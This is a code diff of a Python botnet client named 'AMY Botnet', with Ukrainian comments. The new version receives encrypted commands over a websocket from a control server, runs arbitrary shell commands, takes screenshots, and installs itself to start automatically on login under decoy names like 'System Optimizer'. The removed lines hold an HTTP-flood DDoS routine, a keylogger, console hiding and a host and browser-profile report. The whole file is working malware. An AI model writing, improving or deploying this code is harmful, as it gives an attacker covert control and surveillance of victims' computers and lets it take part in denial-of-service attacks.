@@ -1,147 +1,128 @@
-# ================================================
-# AMY Botnet Client - Optimized Production Version
-# ================================================
-
 import asyncio
 import websockets
 import sys
 import subprocess
 import os
-import time
-import random
 import base64
-import io
-import requests
-import httpx
 import uuid
-import ctypes
-import platform
-import socket
-from PIL import ImageGrab
-from pynput import keyboard
 from io import BytesIO
 
-# ====================== CONFIGURATION ======================
-SERVER_URL = "ws://192.168.10.82:8000/ws/" # ЗАМІНІТЬ ПРИ КОМПІЛЯЦІЇ
-KEY = b"AMY_BOTNET_2026_SECRET_KEY_1337"
+try:
+    from Crypto.Cipher import AES
+except ImportError:
+    from Cryptodome.Cipher import AES
+
+try:
+    from PIL import ImageGrab
+except ImportError:
+    ImageGrab = None
+
+# --- КОНФІГУРАЦІЯ ---
+SERVER_URL = "ws://192.168.10.82:8000/ws/" 
+AES_KEY = b"AMY_BOTNET_2026_SECURE_KEY_V2_32" 
 
 def get_bot_id():
-    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
-    return f"bot_{mac.replace(':', '')[:8]}"
-
-# ====================== XOR ENCRYPTION ======================
-def encrypt_message(msg: str) -> str:
-    encrypted = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(msg.encode('utf-8'))])
-    return base64.b64encode(encrypted).decode('utf-8')
+    return f"bot_{hex(uuid.getnode())[2:10]}"
 
 def decrypt_message(encoded: str) -> str:
     try:
-        encrypted = base64.b64decode(encoded)
-        decrypted = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(encrypted)])
-        return decrypted.decode('utf-8', errors='ignore')
-    except:
-        return encoded
+        raw_data = base64.b64decode(encoded)
+        nonce, tag, ciphertext = raw_data[:16], raw_data[16:32], raw_data[32:]
+        cipher = AES.new(AES_KEY, AES.MODE_GCM, nonce=nonce)
+        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
+    except: return None
 
-# ====================== STEALTH & ANTI-ANALYSIS ======================
-def hide_console():
-    if sys.platform == "win32":
-        hWnd = ctypes.windll.kernel32.GetConsoleWindow()
-        if hWnd != 0:
-            ctypes.windll.user32.ShowWindow(hWnd, 0)
+def encrypt_message(msg: str) -> str:
+    cipher = AES.new(AES_KEY, AES.MODE_GCM)
+    ciphertext, tag = cipher.encrypt_and_digest(msg.encode('utf-8'))
+    return base64.b64encode(cipher.nonce + tag + ciphertext).decode('utf-8')
 
-# ====================== MODULES ======================
-async def http_flood(target_url, duration=60):
-    start_time = time.time()
-    count = 0
-    async with httpx.AsyncClient() as client:
-        while time.time() - start_time < duration:
-            try:
-                await client.get(target_url)
-                count += 1
-                if count % 50 == 0: await asyncio.sleep(0.01)
-            except:
-                pass
-    return f"[DDoS] Finished. Sent {count} requests to {target_url}"
-
-def get_system_report():
-    report = f"--- SYSTEM REPORT ---\n"
-    report += f"ID: {get_bot_id()}\n"
-    report += f"OS: {platform.system()} {platform.release()}\n"
-    report += f"Arch: {platform.machine()}\n"
-    report += f"Hostname: {socket.gethostname()}\n"
-    report += f"Internal IP: {socket.gethostbyname(socket.gethostname())}\n"
-    # Перевірка наявності профілів
-    if sys.platform == "win32":
-        chrome = os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data"
-        if os.path.exists(chrome): report += "[+] Chrome Profile Detected\n"
-    return report
-
-# ====================== MAIN BOT LOOP ======================
-async def run_bot():
-    bot_id = get_bot_id()
-    full_url = f"{SERVER_URL}{bot_id}"
+# --- МОДУЛЬ ПЕРСИСТЕНЦІЇ (АВТОЗАПУСК) ---
+def install_persistence():
+    """Бот сам прописує себе в систему при першому запуску"""
+    script_path = os.path.abspath(sys.argv[0]) # Де лежить цей файл зараз
     
+    if sys.platform != "win32":
+        # Шлях для автозапуску в Linux (XDG Autostart)
+        autostart_dir = os.path.expanduser("~/.config/autostart/")
+        os.makedirs(autostart_dir, exist_ok=True)
+        desktop_file = os.path.join(autostart_dir, "sys_update.desktop")
+        
+        if not os.path.exists(desktop_file):
+            content = f"""[Desktop Entry]
+Type=Application
+Exec=python3 {script_path}
+Hidden=false
+NoDisplay=false
+X-GNOME-Autostart-enabled=true
+Name=System Optimizer
+Comment=Background optimization process
+"""
+            with open(desktop_file, "w") as f:
+                f.write(content)
+            print("[+] Persistence installed (Linux Autostart)")
+    else:
+        # Для Windows можна додати в реєстр (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
+        try:
+            import winreg
+            key = winreg.HKEY_CURRENT_USER
+            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
+                winreg.SetValueEx(reg_key, "SysUpdate", 0, winreg.REG_SZ, f'pythonw.exe "{script_path}"')
+            print("[+] Persistence installed (Windows Registry)")
+        except: pass
+
+async def run_bot():
+    # Встановлюємо автозапуск відразу при старті
+    install_persistence()
+    
+    bot_id = get_bot_id()
+    
+    if sys.platform != "win32":
+        if "DISPLAY" not in os.environ:
+            os.environ["DISPLAY"] = ":0"
+        try:
+            subprocess.run(["xhost", "+local:root"], capture_output=True)
+        except: pass
+
     while True:
         try:
-            async with websockets.connect(full_url, origin=None) as websocket:
-                print(f"[*] Bot {bot_id} online.")
-                
+            async with websockets.connect(f"{SERVER_URL}{bot_id}") as ws:
+                print(f"[*] Bot connected as {bot_id}")
                 while True:
-                    encrypted_command = await websocket.recv()
-                    command = decrypt_message(encrypted_command)
-                    
+                    msg = await ws.recv()
+                    command = decrypt_message(msg)
                     if not command: continue
 
-                    if command == "screenshot":
-                        screenshot = ImageGrab.grab()
-                        buffered = BytesIO()
-                        screenshot.save(buffered, format="PNG")
-                        img_str = base64.b64encode(buffered.getvalue()).decode()
-                        await websocket.send(encrypt_message(f"SCREENSHOT:{img_str}"))
+                    response = ""
                     
-                    elif command.startswith("ddos "):
+                    if command.startswith("shell:"):
+                        real_cmd = command[6:] 
                         try:
-                            _, url = command.split(" ", 1)
-                            # Запуск в фоні, щоб не блокувати бот
-                            asyncio.create_task(websocket.send(encrypt_message(f"[DDoS] Starting attack on {url}...")))
-                            result = await http_flood(url)
-                            await websocket.send(encrypt_message(result))
-                        except:
-                            await websocket.send(encrypt_message("[ERROR] Invalid DDoS syntax. Use: ddos http://target.com"))
-
-                    elif command == "steal":
-                        await websocket.send(encrypt_message(get_system_report()))
-                    
-                    elif command == "keylogger":
-                        def on_press(key):
-                            try: k = str(key.char)
-                            except: k = f" [{str(key)}] "
-                            asyncio.run_coroutine_threadsafe(websocket.send(encrypt_message(f"KEYLOG:{k}")), asyncio.get_event_loop())
-                        listener = keyboard.Listener(on_press=on_press)
-                        listener.start()
-                        await websocket.send(encrypt_message("[SYSTEM] Keylogger started"))
-                    
-                    elif command == "persistence":
-                        if sys.platform == "win32":
-                            app_path = os.path.realpath(sys.executable)
-                            subprocess.run(f'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "AmyBot" /t REG_SZ /d "{app_path}" /f', shell=True)
-                            await websocket.send(encrypt_message("[SYSTEM] Persistence established (Registry)"))
-                        else:
-                            await websocket.send(encrypt_message("[SYSTEM] Persistence only supported on Windows"))
-                    
-                    else:
-                        # Shell commands
-                        try:
-                            proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
-                            stdout, stderr = await proc.communicate()
-                            output = (stdout.decode() + stderr.decode()).strip()
-                            await websocket.send(encrypt_message(output or "[SYSTEM] Command executed."))
+                            proc = subprocess.run(real_cmd, shell=True, capture_output=True, text=True)
+                            response = proc.stdout + proc.stderr
+                            if not response: response = "Executed (no output)."
                         except Exception as e:
-                            await websocket.send(encrypt_message(f"Error: {str(e)}"))
+                            response = f"Error: {str(e)}"
 
-        except Exception as e:
+                    elif command == "screenshot":
+                        if ImageGrab:
+                            try:
+                                shot = ImageGrab.grab()
+                                buf = BytesIO()
+                                shot.save(buf, format="PNG")
+                                response = f"SCREENSHOT:{base64.b64encode(buf.getvalue()).decode()}"
+                            except Exception as e:
+                                response = f"Screenshot Failed: {str(e)}"
+                        else:
+                            response = "Pillow not installed."
+
+                    else:
+                        response = f"Unknown: {command}"
+
+                    await ws.send(encrypt_message(response))
+        except:
             await asyncio.sleep(5)
 
 if __name__ == "__main__":
-    hide_console()
     asyncio.run(run_bot())
